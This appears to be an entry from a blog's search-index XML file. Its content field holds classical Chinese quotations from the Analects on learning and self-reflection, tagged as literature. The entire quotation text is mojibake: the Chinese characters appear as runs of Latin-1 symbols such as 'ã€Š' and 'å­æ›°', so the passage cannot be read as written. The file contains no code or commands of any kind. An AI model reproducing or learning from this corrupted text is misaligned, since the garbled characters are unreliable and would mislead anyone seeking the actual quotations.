    <content type="text"><![CDATA[ã€Šè®ºè¯­Â·ååˆ™ã€‹å­æ›°ï¼šâ€œå­¦è€Œæ—¶ä¹ ä¹‹ï¼Œä¸äº¦è¯´ä¹Žï¼Ÿæœ‰æœ‹è‡ªè¿œæ–¹æ¥ï¼Œä¸äº¦ä¹ä¹Žï¼Ÿäººä¸çŸ¥è€Œä¸æ„ ï¼Œä¸äº¦å›å­ä¹Žï¼Ÿâ€æ›¾å­æ›°ï¼šâ€œå¾æ—¥ä¸‰çœå¾èº«ï¼šä¸ºäººè°‹è€Œä¸å¿ ä¹Žï¼Ÿä¸Žæœ‹å‹äº¤è€Œä¸ä¿¡ä¹Žï¼Ÿä¼ ä¸ä¹ ä¹Žï¼Ÿâ€ å­æ›°ï¼šâ€œæ¸©æ•…è€ŒçŸ¥æ–°ï¼Œå¯ä»¥ä¸ºå¸ˆçŸ£ã€‚â€ å­æ›°ï¼šâ€œå­¦è€Œä¸æ€åˆ™ç½”ï¼Œæ€è€Œä¸å­¦åˆ™æ®†ã€‚â€ å­æ›°ï¼šâ€œç”±ï¼Œè¯²å¥³çŸ¥ä¹‹ä¹Žï¼çŸ¥ä¹‹ä¸ºçŸ¥ä¹‹ï¼Œä¸çŸ¥ä¸ºä¸çŸ¥ï¼Œæ˜¯çŸ¥ä¹Ÿã€‚â€ å­æ›°ï¼šâ€œè§è´¤æ€é½ç„‰ï¼Œè§ä¸è´¤è€Œå†…è‡ªçœä¹Ÿã€‚â€ å­æ›°ï¼šâ€œä¸‰äººè¡Œï¼Œå¿…æœ‰æˆ‘å¸ˆç„‰ã€‚æ‹©å…¶å–„è€…è€Œä»Žä¹‹ï¼Œå…¶ä¸å–„è€…è€Œæ”¹ä¹‹ã€‚â€ æ›¾å­æ›°ï¼šâ€œå£«ä¸å¯ä»¥ä¸å¼˜æ¯…ï¼Œä»»é‡è€Œé“è¿œã€‚ä»ä»¥ä¸ºå·±ä»»ï¼Œä¸äº¦é‡ä¹Žï¼Ÿæ­»è€ŒåŽå·²ï¼Œä¸äº¦è¿œä¹Žï¼Ÿâ€å­æ›°ï¼šâ€œå²å¯’ï¼Œç„¶åŽçŸ¥æ¾æŸä¹‹åŽå‡‹ä¹Ÿã€‚â€ 1å­è´¡é—®æ›°ï¼šâ€œæœ‰ä¸€è¨€è€Œå¯ä»¥ç»ˆèº«è¡Œä¹‹è€…ä¹Žï¼Ÿâ€å­æ›°ï¼šâ€œå…¶æ•ä¹Žï¼å·±æ‰€ä¸æ¬²ï¼Œå‹¿æ–½äºŽäººã€‚â€]]></content>
      <categories>
        <category>æ–‡å­¦</category>
      </categories>
      <tags>
        <tag>æ–‡å­¦</tag>
        <tag>çœèº«</tag>
      </tags>
  </entry>
</search>
